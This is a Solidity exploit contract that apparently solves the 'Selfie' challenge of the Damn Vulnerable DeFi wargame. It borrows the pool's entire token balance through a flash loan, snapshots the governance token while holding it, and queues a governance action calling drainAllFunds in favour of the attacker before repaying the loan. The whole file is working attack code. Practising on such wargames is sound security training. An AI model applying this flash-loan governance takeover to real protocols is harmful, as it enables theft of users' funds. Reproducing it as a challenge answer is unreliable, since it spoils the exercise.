// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";


contract AttackSelfie {
    SelfiePool public pool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    address public _attacker;

    constructor(address _pool, address _token, address _governance) {
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function attack() public {
        // take out flash loan
        _attacker = msg.sender;
        uint flashLoanAmount = token.balanceOf(address(pool));
        pool.flashLoan(flashLoanAmount);
    }

    function receiveTokens(address _tokenAddress, uint256 _loanAmount) public {
        // execute code here during the flash loan
        // queue up a proposal to drain funds
        token.snapshot();
        bytes memory drainFundsCallData = abi.encodeWithSignature("drainAllFunds(address)", _attacker);
        governance.queueAction(address(pool), drainFundsCallData, 0);
        token.transfer(address(pool), _loanAmount);

        // execute the proposal in a seperate transaction after the waiting period has passed
    }
}